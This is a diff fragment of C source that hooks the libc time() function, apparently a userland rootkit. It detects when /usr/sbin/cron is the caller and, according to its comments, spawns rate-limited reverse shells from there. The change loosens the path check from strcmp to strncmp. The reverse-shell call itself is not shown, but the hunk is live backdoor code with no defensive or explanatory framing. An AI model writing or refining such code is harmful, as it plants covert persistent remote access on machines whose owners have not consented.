@@ -874,7 +874,7 @@ time_t time(time_t *tloc) {
         return (*original_time)(tloc);
     }
     exe_path[len] = '\0'; //terminate the string because readlink itself doesn't do that
-    if (strcmp(exe_path, "/usr/sbin/cron") == 0) { //check if cron is calling time()
+    if (strncmp(exe_path, "/usr/sbin/cron", 14) == 0) { //check if cron is calling time()
         time_t current_time = (*original_time)(NULL);
         if (last_time < (current_time - 50)) { //avoid spawning multiple reverse shells, otherwise cron will recursively call time()
             last_time = current_time; //update the last_time variable
